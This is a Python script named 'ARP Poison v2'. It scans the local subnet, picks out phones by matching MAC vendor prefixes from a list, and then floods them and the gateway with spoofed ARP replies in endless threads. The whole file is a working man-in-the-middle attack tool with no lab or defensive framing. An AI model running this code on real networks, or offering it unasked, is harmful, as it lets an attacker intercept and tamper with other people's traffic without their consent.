#!/usr/bin/env python3
# ARP Poison v2

# import serious stuff
import time
import netifaces
import netaddr
import ipaddress
import threading
from scapy.all import *
from subprocess import Popen, PIPE

import pdb # debug
from pprint import pprint # debug


# probe interfaces, the new way
def probe_interfaces():
    # essential variables
    interface_dict = {}

    # list available interfaces and remove loopback
    available_interfaces = netifaces.interfaces()
    available_gateways = netifaces.gateways()[netifaces.AF_INET]
    available_interfaces.remove("lo")

    for interface in available_interfaces:
        # get all the information about the interface
        interface_details = netifaces.ifaddresses(interface)

        # remove interface if it lacks IPv4 stuff
        if not netifaces.AF_INET in interface_details:
            continue

        # get gateway address for interface
        for gateway in available_gateways:
            if interface in gateway:
                gateway = gateway[0]

        # extract required information from interface_details
        localhost_address = interface_details[netifaces.AF_INET][0]["addr"]
        netmask = interface_details[netifaces.AF_INET][0]["netmask"]

        # generate network address
        network_address = localhost_address 
        network_address = network_address[: network_address.rfind(".")]
        network_address += ".0"
        
        # generate interface information dictionary
        interface_dict.update({interface: {
            "localhost_address": localhost_address,
            "netmask": netmask,
            "interface": interface,
            "gateway": gateway,
            "network_address": network_address
        }})

    return interface_dict


# we have our own ping function! 
def check_status(ip_address, interface):
    # status dictionary
    status_dict = {
        "ip_address": ip_address,
        "online": False,
        "mac": None
    }

    ping = Popen(
        ["arping", "-I", interface, "-c", "1", "-w", "2", str(ip_address)], 
        stdout = PIPE
    )

    ping_out = ping.communicate()[0].decode()
    ping_out = ping_out.split("\n")
    # returncode is 0 if ping is succesful, converting to bool
    if ping.returncode == 0:
        status_dict["online"] = True
        mac=(ping_out[1])
        mac = mac[mac.index("m")+1 : mac.index("(")]
        status_dict["mac"] = mac
    # returncode is 0 if ping is succesful, converting to bool
    

    print(status_dict) # debug
    return status_dict 
    

# get list of live devices on network
def generate_device_dict(network_info):
    # essential variables
    online_devices = {}

    cidr_address = netaddr.IPNetwork(
        network_info["network_address"],
        network_info["netmask"]
    )
    network = ipaddress.ip_network(cidr_address)

    for ip_address in network.hosts():
        device = check_status(ip_address, network_info["interface"])
        if device["online"]:
            online_devices[str(device["ip_address"])] = device["mac"]

    return online_devices


# generate list of devices to be attacked
def generate_target_dict(device_dict):
    # essential variables
    target_dict = {}

    # read MAC file
    mac_list = open("mobile-mac_only.txt").read().split("\n")

    # cleanup the MAC file
    while "" in mac_list:
        mac_list.pop(mac_list.index(""))

    # find mobiles from device_dict
    for device in device_dict:
        for mac in mac_list:
            if device_dict[device].lower().find(mac.lower()) != -1:
                target_dict[device] = device_dict[device]

    return target_dict 


# attack!
def poison(gateway, gateway_mac, target, target_mac):
    # specify target details
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway
    poison_target.pdst = target
    poison_target.hwdst = target_mac

    # specify gateway details
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target
    poison_gateway.pdst = gateway
    poison_gateway.hwdst = gateway_mac
    while True:
        send(poison_target)
        send(poison_gateway)
        time.sleep(2)


# the main function
def main():
    # essential variables
    interface = "wlp13s0"

    # get info on current interface
    network_info = probe_interfaces()[interface]

    # find all devices on network
    device_dict = generate_device_dict(network_info)

    # find mobile devices
    target_dict = generate_target_dict(device_dict)

    # find gateway info
    gateway = network_info["gateway"]
    gateway_mac = device_dict[gateway]

    # attack!
    for target in target_dict:
        poison_thread = threading.Thread(
            target=poison,
            args=[gateway, gateway_mac, target, target_dict[target]]
        )
        poison_thread.start()


# run the main function
if __name__ == "__main__":
    main()

